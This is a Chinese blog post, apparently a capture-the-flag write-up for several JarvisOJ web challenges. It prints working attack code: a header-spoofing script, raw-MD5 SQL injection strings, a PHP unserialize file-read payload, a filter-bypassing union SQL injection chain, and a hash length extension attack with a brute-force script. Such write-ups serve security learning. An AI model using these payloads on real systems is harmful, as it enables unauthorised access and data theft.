{"title":"JarvisOJ WP","slug":"JarvisOJ","date":"2019-07-23T09:32:23.740Z","updated":"2019-07-31T13:59:59.259Z","comments":true,"path":"api/articles/JarvisOJ.json","photos":[],"link":"","excerpt":"真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！","covers":["http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg"],"content":"<p>真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！</p>\n<a id=\"more\"></a>\n\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><p>有时间也做做别的</p>\n<h3 id=\"0x01-PORT51\"><a href=\"#0x01-PORT51\" class=\"headerlink\" title=\"0x01 PORT51\"></a>0x01 PORT51</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32770/\" title=\"题目链接\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32770/</a></p>\n<p>要用本地51端口去访问</p>\n<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><p>但是应该是题目问题，没显示出来flag。</p>\n<h3 id=\"0x02-Localhost\"><a href=\"#0x02-Localhost\" class=\"headerlink\" title=\"0x02 Localhost\"></a>0x02 Localhost</h3><p>题目链接 <a href=\"http://web.jarvisoj.com:32774/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32774/</a></p>\n<p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p>\n<pre><code>import requests\n\nurl=&apos;http://web.jarvisoj.com:32774/&apos;\n\ns=requests.session()\ndata={\n&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;\n}\nr=s.get(url,headers=data)\nprint(r.text)</code></pre><p>返回信息包含flag</p>\n<h4 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h4><p>这里再稍稍补充一下HTTP协议请求头的知识</p>\n<ol>\n<li>每个HTTP请求的第一行都由3个以空格间隔的项目组成</li>\n<li>一个说明HTTP方法的动词，主要作用是从Web服务器获取一个资源，GET请求并没有消息主题，因此消息头后的空白行中没有其他数据。</li>\n<li>第二个是请求的URL，通常由一个所请求的资源名称以及客户端向该资源提交的参数的可选查询字符串组成</li>\n<li>第三个是使用的HTTP版本，常用HTTP版本为1.1和1.0，我们遇到的唯一差异可能就是1.1版本必须使用Host请求</li>\n<li>Referer消息头表示用于发出请求的原始URL</li>\n<li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息</li>\n<li>Host消息头用于指定出现在被访问的完整URL中的主机名称，如果几个WEB站点以相同的一台服务器为主机就需要指定HOST，因为第一行中的URL通常不包含主机名称。服务器可以通过该字段进行IP过滤操作。</li>\n<li>X-FORWARDED-FOR当你使用了代理时web服务器就不知道你的真实IP了，为了避免这种情况代理服务器会增加一个该字段信息，把链接他的客户端IP加到这个消息头里，保证服务器能获取到真实IP。这是一个扩展头。</li>\n<li>cookie为服务器端生成的存于客户端的身份标识</li>\n</ol>\n<h3 id=\"0x03-Login\"><a href=\"#0x03-Login\" class=\"headerlink\" title=\"0x03 Login\"></a>0x03 Login</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32772/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32772/</a></p>\n<p>打开题目是一个密码的提交框，随便测一下没什么收获，查看请求信息发现HINT在响应头里</p>\n<pre><code>&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p>\n<pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p>\n<p>我们需要寻找一个字符串在md5之后含有 <code>&#39; or &#39;</code> 之类的可以产生闭合的。</p>\n<p>国外的大佬在2010年跑出来了几个符合条件的<a href=\"http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes\" title=\"这是那篇博客\" target=\"_blank\" rel=\"noopener\">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>\n<p>我们可以用两个 </p>\n<pre><code>129581926211651571912466741651878684928\n\nffifdyop</code></pre><h3 id=\"0x04-神盾局的秘密\"><a href=\"#0x04-神盾局的秘密\" class=\"headerlink\" title=\"0x04 神盾局的秘密\"></a>0x04 神盾局的秘密</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32768/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32768/</a></p>\n<p>进入题目后查看源码发现ba64加密的字符串，</p>\n<p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p>\n<p>尝试编码index.php读源码</p>\n<pre><code>&lt;?php \n    require_once(&apos;shield.php&apos;);\n    $x = new Shield();\n    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\n    if (!empty($g)) {\n        $x = unserialize($g);\n    }\n    echo $x-&gt;readfile();\n?&gt;</code></pre><p>可以看到包含了shield.php，再读shield.php</p>\n<pre><code>&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &apos;&apos;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;</code></pre><p>简单的序列化，控制file变量</p>\n<pre><code>&lt;?php\n    //flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$example = new Shield();\n$example-&gt;file = &quot;pctf.php&quot;;\necho serialize($example);\n?&gt;</code></pre><h3 id=\"IN-A-Mess\"><a href=\"#IN-A-Mess\" class=\"headerlink\" title=\"IN A Mess\"></a>IN A Mess</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32780/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32780/</a></p>\n<p>查看源码发现hint，进而读取源码</p>\n<pre><code>&lt;?php\n\nerror_reporting(0);\necho &quot;&lt;!--index.phps--&gt;&quot;;\n\nif(!$_GET[&apos;id&apos;])\n{\n    header(&apos;Location: index.php?id=1&apos;);\n    exit();\n}\n$id=$_GET[&apos;id&apos;];\n$a=$_GET[&apos;a&apos;];\n$b=$_GET[&apos;b&apos;];\nif(stripos($a,&apos;.&apos;))\n{\n    echo &apos;Hahahahahaha&apos;;\n    return ;\n}\n$data = @file_get_contents($a,&apos;r&apos;);\nif($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)\n{\n    require(&quot;flag.txt&quot;);\n}\nelse\n{\n    print &quot;work harder!harder!harder!&quot;;\n}\n\n\n?&gt;</code></pre><p>简单分析之后我们需要注意几个点</p>\n<ol>\n<li>stripos()字符串截取函数，与strpos不同前者不区分大小写。</li>\n<li>php中 <code>0admin == 0</code> ,在比较时会将字符串转换成整型再比较。</li>\n<li>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法，Note: 如果要打开有特殊字符的 URL （比如说有空格），就需要使用 urlencode() 进行 URL 编码。也就是说我们可以在服务器上放一个文件然后传ip地址，如果这样做的话我们还要避免 <code>.</code>,我们可以通过将点分十进制转换为十进制。转换器：<a href=\"https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef\" title=\"地址转换\" target=\"_blank\" rel=\"noopener\">https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef</a>。同时我们也可以使用伪协议：<code>php://input</code> 来Post一个字符串。</li>\n<li>eregi()不区分大小写的正则表达式匹配.这里我们通过%00截断来绕过eregi的检测。</li>\n<li>%00在strlen的判断中仍占3个字符。</li>\n</ol>\n<p>我们进行构造</p>\n<pre><code>http://web.jarvisoj.com:32780/index.php\n?id=0admin\n&amp;a=php://input\n&amp;b=%00admin</code></pre><p>得到</p>\n<p>﻿<code>Come ON!!! {/^HT2mCpcvOLf}</code></p>\n<p>进行访问得到</p>\n<pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>现在开始这是一道注入题了</p>\n<p>测试id=2,返回</p>\n<pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1’</p>\n<pre><code>SELECT * FROM content WHERE id=1&apos;</code></pre><p>id=1 and 1=1 #</p>\n<pre><code>you bad boy/girl!</code></pre><p>测试发现我们不需要闭合单引号与注释，同时过滤了空格。对于空格首先尝试/**/，发现不行，那么/*a*/呢？</p>\n<pre><code>?id=1/*a*/and/*a*/1=1 \nhi666</code></pre><p>这样可以。然后猜测字段个数</p>\n<pre><code>?id=1/*a*/order/*a*/by/*a*/3</code></pre><p>看回显位，这里union,select 都被过滤，双写绕过</p>\n<pre><code>?id=-1/*a*/ununionion/*a*/selselectect/*a*/1,2,3</code></pre><p>看数据库</p>\n<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),database()</code></pre><p>看表，这里from同样双写</p>\n<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(table_name)/*a*/frfromom/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()</code></pre><p>看字段，不能直接传表名，需要16进制编码一下</p>\n<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(column_name)/*a*/frfromom/*a*/information_schema.columns/*a*/where/*a*/table_name=0x636f6e74656e74</code></pre><p>看信息得到flag</p>\n<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),context/*a*/frofromm/*a*/content    </code></pre><h3 id=\"flag在管理员手里\"><a href=\"#flag在管理员手里\" class=\"headerlink\" title=\"flag在管理员手里\"></a>flag在管理员手里</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32778/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32778/</a></p>\n<p>拿到题目看到 <strong>Only Admin can see the flag!!</strong></p>\n<p>先看看响应头信息，尝试改一下cookie为admin，果然没这么简单。</p>\n<p>拿扫描器扫一下扫到了<code>index.php~</code>,看一下16进制数据发现是vim产生的文件，先改一下后缀为<code>index.php.swp</code>用<code>vim -r index.php</code> 恢复一下得到源码.</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Web 350&lt;/title&gt;\n&lt;style type=&quot;text/css&quot;&gt;\n    body {\n        background:gray;\n        text-align:center;\n    }\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;?php \n        $auth = false;\n        $role = &quot;guest&quot;;\n        $salt = \n        if (isset($_COOKIE[&quot;role&quot;])) {\n            $role = unserialize($_COOKIE[&quot;role&quot;]);\n            $hsh = $_COOKIE[&quot;hsh&quot;];\n            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {\n                $auth = true;\n            } else {\n                $auth = false;\n            }\n        } else {\n            $s = serialize($role);\n            setcookie(&apos;role&apos;,$s);\n            $hsh = md5($salt.strrev($s));\n            setcookie(&apos;hsh&apos;,$hsh);\n        }\n        if ($auth) {\n            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;\n        } else {\n            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;\n        }\n    ?&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;</code></pre><p>重点是 <code>if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])))</code></p>\n<p>HASH长度扩展攻击没错了。</p>\n<h4 id=\"Hash-Length-Extension-Attacks\"><a href=\"#Hash-Length-Extension-Attacks\" class=\"headerlink\" title=\"Hash Length Extension Attacks\"></a>Hash Length Extension Attacks</h4><p><strong>原理</strong></p>\n<blockquote>\n<p>服务器将sercet 和 message 连接在一起，然后用摘要算法取摘要，研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。</p>\n<p>哈希摘要算法，如MD5、SHA1、SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：当知道hash(secret + message)的值及secret长度的情况下，可以轻松推算出hash(secret + message||padding||m’)。在这里m’是任意数据，||是连接符，可以为空,padding是secret后的填充字节。hash的padding字节包含整个消息的长度，因此，为了能准确计算出padding的值，secret的长度我们也是需要知道的。</p>\n<p>当我们填充后，服务器算出的原始hash值，正好与我们添加扩展字符串并覆盖初始链变量所计算出来的一样。这是因为攻击者的哈希计算过程，相当于从服务器计算过程的一半紧接着进行下去。提交此hash值便能通过验证了，这就是所谓的哈希长度拓展攻击(Hash Length Extension Attacks)。</p>\n</blockquote>\n<p>MD5会对消息进行分组，每组64Byte,也就是512bit,不足512bit的会补位，使长度补充到56Byte,补位的二进制表示是在消息后面加一个1，后面都是0，也就是说在16进制下我们需要在后面补80，其他都是0，直到补到56Byte。</p>\n<p>剩下的8Byte表示补位前消息长度，该长度是小端存储，高字节放在高地址中。计算开始前有一组初始向量负责第一轮的加密，此后每一次加密的结果作为下一次加密的初始向量。</p>\n<p>MD5的初始向量是</p>\n<pre><code>A=0x67452301\nB=0xefcdab89\nC=0x98badcfe\nD=0x10325476</code></pre><p>我们举个例子来说明一下补位</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg\" alt></p>\n<p>再来看这道题</p>\n<p>我们不知道salt的长度，而算法的核心就是要知道其长度，不过我们可以爆破猜出来。同时这里对role反序了。</p>\n<p>我们利用hashpump跑一下</p>\n<pre><code>hashpump\nInput Signature: 3a4727d57463f122833d9e732f94e4e0 //上一轮的结果，我们已经抓包得到了 \nInput Data: ;&quot;tseug&quot;:5:s  //原来的数据\nInput Key Length: 12      //长度是试出来的\nInput Data to Add: ;&quot;nimda&quot;:5:s //我们要添加的数据\nfcdc3840332555511c4e4323f6decb07\n;&quot;tseug&quot;:5:s\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00;&quot;nimda&quot;:5:s  //记得逆序一下，然后URL编码</code></pre><p>得到</p>\n<pre><code>role: s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B\n\nhsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>放在cookie里就可以了。</p>\n<p>放一个其他人写的脚本</p>\n<pre><code># -*- coding: utf-8 -*-\nimport requests,hashpumpy,urllib\ndef webre(): #py2\nurl = &apos;http://web.jarvisoj.com:32778/&apos;\nsha = &apos;3a4727d57463f122833d9e732f94e4e0&apos;\nstring0 = &apos;;&quot;tseug&quot;:5:s&apos;\nstring1 = &apos;;&quot;nimda&quot;:5:s&apos;\nfor i in range(15):\ndigest, message = hashpumpy.hashpump(sha,string0,string1,i)\npayload ={&apos;role&apos;:urllib.quote(message[::-1]), &apos;hsh&apos;:digest}\n#payload ={&apos;role&apos;:(message[::-1]), &apos;hsh&apos;:digest}\nprint i,payload\nhtml = requests.get(url,cookies=payload).text#提交答案\nif &apos;Welcome&apos; in html:\nprint html\n\nwebre()</code></pre><p>参考链接：</p>\n<blockquote>\n<p><a href=\"https://xz.aliyun.com/t/2563#toc-2\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2563#toc-2</a></p>\n<p><a href=\"https://www.jianshu.com/p/5342d07a6956\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/5342d07a6956</a><br><a href=\"https://www.freebuf.com/articles/web/69264.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/69264.html</a></p>\n</blockquote>\n","categories":[],"tags":[]}